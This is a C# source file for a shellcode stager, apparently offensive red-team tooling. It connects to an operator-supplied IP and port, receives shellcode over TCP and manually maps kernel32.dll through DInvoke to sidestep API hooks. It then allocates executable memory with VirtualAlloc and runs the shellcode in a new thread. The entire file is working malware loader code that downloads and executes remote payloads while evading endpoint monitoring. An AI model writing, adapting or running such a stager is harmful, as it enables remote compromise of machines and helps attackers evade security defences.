using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using DInvoke.DynamicInvoke;
using DInvoke.Data;
using System.Diagnostics.Eventing.Reader;

namespace Stager
{
    internal class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAllocD(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateThreadD(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {

            string lIP = args[0];
            int lPort = int.Parse(args[1]);
            IPAddress ipAddress = IPAddress.Parse(lIP);
            var ipEndPoint = new IPEndPoint(ipAddress, lPort);

            //Connect to the python listening server
            TcpClient client = new TcpClient();
            client.Connect(ipEndPoint);
            NetworkStream stream = client.GetStream();

            //Receive the size of the first stage payload
            var buffer = new byte[4];
            stream.Read(buffer, 0, buffer.Length);
            Int32 stgrSize = BitConverter.ToInt32(buffer, 0);


            //Receive the stager shellcode
            byte[] buf = new byte[stgrSize];
            stream.Read(buf, 0, buf.Length);

            //Map kernel32.dll to memory
            PE.PE_MANUAL_MAP kern32DLL = new PE.PE_MANUAL_MAP();
            kern32DLL = DInvoke.ManualMap.Map.MapModuleToMemory(@"C:\Windows\System32\kernel32.dll");

            //Call VirtualAlloc to reserve memory for the shellcode
            object[] vaparameters = { IntPtr.Zero, (UInt32)buf.Length, (UInt32)0x3000, (UInt32)0x40 };
            IntPtr addr = (IntPtr)Generic.CallMappedDLLModuleExport(kern32DLL.PEINFO, kern32DLL.ModuleBase, "VirtualAlloc", typeof(VirtualAllocD), vaparameters, false);
            //Copy the stager shellcode to the allocated memory
            Marshal.Copy(buf, 0, addr, buf.Length);

            //Invoke the stager shellcode
            object[] ctparameters = { IntPtr.Zero, (UInt32)0, addr, IntPtr.Zero, (UInt32)0, IntPtr.Zero };
            IntPtr hThread = (IntPtr)Generic.CallMappedDLLModuleExport(kern32DLL.PEINFO, kern32DLL.ModuleBase, "CreateThread", typeof(CreateThreadD), ctparameters, false);
            Console.ReadLine();

        }
    }
}
